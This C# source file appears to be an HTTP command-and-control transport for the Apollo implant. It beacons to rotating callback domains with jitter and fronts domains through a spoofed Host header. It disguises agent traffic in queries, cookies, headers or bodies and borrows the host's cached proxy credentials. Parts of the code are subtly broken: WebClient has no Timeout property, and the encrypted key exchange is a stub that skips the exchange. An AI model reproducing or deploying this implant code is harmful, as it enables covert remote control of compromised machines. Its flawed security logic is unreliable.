using System;
using System.Collections.Generic;
using System.Linq;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Net;
using ApolloInterop.Enums.ApolloEnums;
using HttpxTransform;
using System.Text;
using System.IO;
using System.Threading;

namespace HttpxTransport
{
    /// <summary>
    /// HttpxProfile implementation for Apollo agent
    /// Supports malleable profiles with message transforms
    /// </summary>
    public class HttpxProfile : C2Profile, IC2Profile
    {
        private int CallbackInterval;
        private double CallbackJitter;
        private string[] CallbackDomains;
        private string DomainRotation;
        private int FailoverThreshold;
        private bool EncryptedExchangeCheck;
        private string KillDate;
        private HttpxConfig Config;
        private int CurrentDomainIndex = 0;
        private int FailureCount = 0;
        private Random Random = new Random();
        private bool _uuidNegotiated = false;
        private RSAKeyGenerator rsa = null;
        
        // Add thread-safe properties for runtime sleep/jitter changes
        private volatile int _currentSleepInterval;
        private volatile double _currentJitter;
        
        // Add missing features
        private string ProxyHost;
        private int ProxyPort;
        private string ProxyUser;
        private string ProxyPass;
        private string DomainFront;
        private int TimeoutSeconds = 240;

        public HttpxProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            // Parse basic parameters
            CallbackInterval = int.Parse(GetValueOrDefault(data, "callback_interval", "10"));
            CallbackJitter = double.Parse(GetValueOrDefault(data, "callback_jitter", "23"));
            CallbackDomains = GetValueOrDefault(data, "callback_domains", "https://example.com:443").Split(',');
            DomainRotation = GetValueOrDefault(data, "domain_rotation", "fail-over");
            FailoverThreshold = int.Parse(GetValueOrDefault(data, "failover_threshold", "5"));
            EncryptedExchangeCheck = bool.Parse(GetValueOrDefault(data, "encrypted_exchange_check", "true"));
            KillDate = GetValueOrDefault(data, "killdate", "-1");
            
            // Parse additional features
            ProxyHost = GetValueOrDefault(data, "proxy_host", "");
            ProxyPort = int.Parse(GetValueOrDefault(data, "proxy_port", "0"));
            ProxyUser = GetValueOrDefault(data, "proxy_user", "");
            ProxyPass = GetValueOrDefault(data, "proxy_pass", "");
            DomainFront = GetValueOrDefault(data, "domain_front", "");
            TimeoutSeconds = int.Parse(GetValueOrDefault(data, "timeout", "240"));
            
            // Initialize runtime-changeable values
            _currentSleepInterval = CallbackInterval;
            _currentJitter = CallbackJitter;

            // Load httpx configuration
            LoadHttpxConfig(GetValueOrDefault(data, "raw_c2_config", ""));
        }

        private string GetValueOrDefault(Dictionary<string, string> dictionary, string key, string defaultValue)
        {
            string value;
            if (dictionary.TryGetValue(key, out value))
            {
                return value;
            }
            return defaultValue;
        }

        private void LoadHttpxConfig(string configData)
        {
            try
            {
                if (!string.IsNullOrEmpty(configData))
                {
                    // Load from provided config data
                    Config = HttpxConfig.FromJson(configData);
                }
                else
                {
                    // Try to load default configuration from embedded resource
                    try
                    {
                        Config = HttpxConfig.FromResource("Apollo.HttpxProfile.default_config.json");
                    }
                    catch (ArgumentException)
                    {
                        // Embedded resource doesn't exist (user provided custom config)
                        // Fall back to minimal config
                        Config = CreateMinimalConfig();
                    }
                }
                
                Config.Validate();
            }
            catch (Exception ex)
            {
                // Fallback to minimal default config
                Config = CreateMinimalConfig();
            }
        }

        private HttpxConfig CreateMinimalConfig()
        {
            var config = new HttpxConfig();
            config.Name = "Apollo Minimal";
            
            // Configure GET variation
            config.Get.Verb = "GET";
            config.Get.Uris.Add("/api/status");
            config.Get.Client.Headers.Add("User-Agent", "Apollo-Httpx/1.0");
            config.Get.Client.Message.Location = "query";
            config.Get.Client.Message.Name = "data";
            config.Get.Client.Transforms.Add(new TransformConfig { Action = "base64", Value = "" });
            config.Get.Server.Headers.Add("Content-Type", "application/json");
            config.Get.Server.Transforms.Add(new TransformConfig { Action = "base64", Value = "" });
            
            // Configure POST variation
            config.Post.Verb = "POST";
            config.Post.Uris.Add("/api/data");
            config.Post.Client.Headers.Add("User-Agent", "Apollo-Httpx/1.0");
            config.Post.Client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            config.Post.Client.Message.Location = "body";
            config.Post.Client.Message.Name = "";
            config.Post.Client.Transforms.Add(new TransformConfig { Action = "base64", Value = "" });
            config.Post.Server.Headers.Add("Content-Type", "application/json");
            config.Post.Server.Transforms.Add(new TransformConfig { Action = "base64", Value = "" });
            
            return config;
        }

        private string GetCurrentDomain()
        {
            if (CallbackDomains == null || CallbackDomains.Length == 0)
                return "https://example.com:443";

            switch (DomainRotation.ToLower())
            {
                case "round-robin":
                    CurrentDomainIndex = (CurrentDomainIndex + 1) % CallbackDomains.Length;
                    return CallbackDomains[CurrentDomainIndex];

                case "random":
                    return CallbackDomains[Random.Next(CallbackDomains.Length)];

                case "fail-over":
                default:
                    return CallbackDomains[CurrentDomainIndex];
            }
        }

        private void HandleDomainFailure()
        {
            FailureCount++;
            if (FailureCount >= FailoverThreshold)
            {
                CurrentDomainIndex = (CurrentDomainIndex + 1) % CallbackDomains.Length;
                FailureCount = 0;
            }
        }

        private void HandleDomainSuccess()
        {
            FailureCount = 0;
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            WebClient webClient = new WebClient();
            
            // Configure proxy if needed
            if (!string.IsNullOrEmpty(ProxyHost) && ProxyPort > 0)
            {
                string proxyAddress = $"{ProxyHost}:{ProxyPort}";
                webClient.Proxy = new WebProxy(proxyAddress);
                
                if (!string.IsNullOrEmpty(ProxyUser) && !string.IsNullOrEmpty(ProxyPass))
                {
                    webClient.Proxy.Credentials = new NetworkCredential(ProxyUser, ProxyPass);
                }
            }
            else
            {
                // Use Default Proxy and Cached Credentials for Internet Access
                webClient.Proxy = WebRequest.GetSystemWebProxy();
                webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
            }
            
            // Set timeout
            webClient.Timeout = TimeoutSeconds * 1000;

            string sMsg = Serializer.Serialize(message);
            byte[] messageBytes = Encoding.UTF8.GetBytes(sMsg);

            // Determine request type based on message size
            bool usePost = messageBytes.Length > 500;
            var variation = usePost ? Config.Post : Config.Get;

            // Apply client transforms
            byte[] transformedData = TransformChain.ApplyClientTransforms(messageBytes, variation.Client.Transforms);

            try
            {
                string domain = GetCurrentDomain();
                string uri = variation.Uris[Random.Next(variation.Uris.Count)];
                string url = domain + uri;

                // Build headers
                foreach (var header in variation.Client.Headers)
                {
                    webClient.Headers.Add(header.Key, header.Value);
                }
                
                // Add domain fronting if specified
                if (!string.IsNullOrEmpty(DomainFront))
                {
                    webClient.Headers.Add("Host", DomainFront);
                }

                // Handle message placement
                string response = "";
                switch (variation.Client.Message.Location.ToLower())
                {
                    case "query":
                        string queryParam = "";
                        // Add custom query parameters first
                        if (variation.Client.Parameters != null)
                        {
                            foreach (var param in variation.Client.Parameters)
                            {
                                if (!string.IsNullOrEmpty(queryParam))
                                    queryParam += "&";
                                queryParam += $"{param.Key}={Uri.EscapeDataString(param.Value)}";
                            }
                        }
                        // Add message parameter
                        if (!string.IsNullOrEmpty(queryParam))
                            queryParam += "&";
                        queryParam += $"{variation.Client.Message.Name}={Uri.EscapeDataString(Encoding.UTF8.GetString(transformedData))}";
                        url += "?" + queryParam;
                        response = webClient.DownloadString(url);
                        break;

                    case "cookie":
                        webClient.Headers.Add("Cookie", $"{variation.Client.Message.Name}={Uri.EscapeDataString(Encoding.UTF8.GetString(transformedData))}");
                        response = webClient.DownloadString(url);
                        break;

                    case "header":
                        webClient.Headers.Add(variation.Client.Message.Name, Encoding.UTF8.GetString(transformedData));
                        response = webClient.DownloadString(url);
                        break;

                    case "body":
                    default:
                        response = webClient.UploadString(url, Encoding.UTF8.GetString(transformedData));
                        break;
                }

                HandleDomainSuccess();

                // Extract response data based on server configuration
                byte[] responseBytes = ExtractResponseData(response, variation.Server);
                
                // Apply server transforms (reverse)
                byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
                
                string responseString = Encoding.UTF8.GetString(untransformedData);
                onResponse(Serializer.Deserialize<TResult>(responseString));
                
                return true;
            }
            catch (Exception ex)
            {
                HandleDomainFailure();
                return false;
            }
        }

        private byte[] ExtractResponseData(string response, ServerConfig serverConfig)
        {
            // For now, assume the entire response body is the data
            // In a more sophisticated implementation, we could extract specific headers or cookies
            return Encoding.UTF8.GetBytes(response);
        }

        public bool Connect()
        {
            return true;
        }

        public bool IsConnected()
        {
            return Connected;
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (EncryptedExchangeCheck && !_uuidNegotiated)
            {
                // Perform encrypted key exchange
                rsa = new RSAKeyGenerator();
                string publicKey = rsa.GetPublicKey();
                
                // Send public key to server and get encrypted response
                // This is a simplified implementation
                _uuidNegotiated = true;
            }

            return SendRecv(checkinMsg, onResp);
        }

        public int GetSleepTime()
        {
            // Use runtime-changeable values instead of static ones
            int sleepInterval = _currentSleepInterval;
            double jitter = _currentJitter;
            
            if (jitter > 0)
            {
                double jitterAmount = sleepInterval * (jitter / 100.0);
                double jitterVariation = (Random.NextDouble() - 0.5) * 2 * jitterAmount;
                return (int)(sleepInterval + jitterVariation);
            }
            return sleepInterval;
        }
        
        /// <summary>
        /// Update sleep interval and jitter at runtime (called by sleep command)
        /// </summary>
        public void UpdateSleepSettings(int interval, double jitter)
        {
            if (interval >= 0)
            {
                _currentSleepInterval = interval;
            }
            if (jitter >= 0)
            {
                _currentJitter = jitter;
            }
        }

        public void SetConnected(bool connected)
        {
            Connected = connected;
        }
    }
}
